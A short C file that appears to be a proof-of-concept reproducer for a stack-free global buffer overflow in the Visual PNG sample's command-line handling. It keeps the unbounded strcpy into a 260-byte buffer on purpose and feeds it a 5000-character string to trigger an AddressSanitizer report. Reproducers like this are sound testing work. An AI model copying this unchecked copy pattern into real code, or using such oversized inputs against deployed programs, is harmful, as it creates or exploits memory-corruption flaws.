#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Mimic Windows MAX_PATH */
#ifndef MAX_PATH
#define MAX_PATH 260
#endif

/* Global variables as in the original file */
static char *szProgName = "visupng";
static char *szAppName  = "Visual PNG";
static char *szIconName = "visupng";
static char szCmdFileName[MAX_PATH];

/* Minimal typedefs to avoid pulling in Windows headers */
typedef void* HINSTANCE;
typedef char* PSTR;

/* Reimplementation of the vulnerable logic from WinMain() focusing on lines 106-114 */
int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
{
    (void)hInstance; (void)hPrevInstance; (void)iCmdShow; /* unused in this reproducer */

    /* Vulnerable command line handling (copied from the source context) */
    if ((szCmdLine != NULL) && (*szCmdLine != '\0'))
        if (szCmdLine[0] == '"')
            strncpy(szCmdFileName, szCmdLine + 1, strlen(szCmdLine) - 2);
        else
            strcpy(szCmdFileName, szCmdLine); /* out-of-bounds write when szCmdLine is longer than MAX_PATH-1 */
    else
        strcpy(szCmdFileName, "");

    return 0;
}

int main(void)
{
    /* Craft a command line much longer than MAX_PATH to trigger the overflow in strcpy */
    const size_t biglen = 5000; /* >> MAX_PATH */
    char *cmd = (char*)malloc(biglen + 1);
    if (!cmd) {
        perror("malloc");
        return 1;
    }

    /* Ensure we take the strcpy branch (first char is not a quote) */
    memset(cmd, 'A', biglen);
    cmd[biglen] = '\0';

    /* Call the vulnerable routine */
    WinMain(NULL, NULL, cmd, 0);

    /* Touch szCmdFileName to keep it referenced (the overflow should already have been detected by ASan) */
    printf("First char copied: %c\n", szCmdFileName[0]);

    free(cmd);
    return 0;
}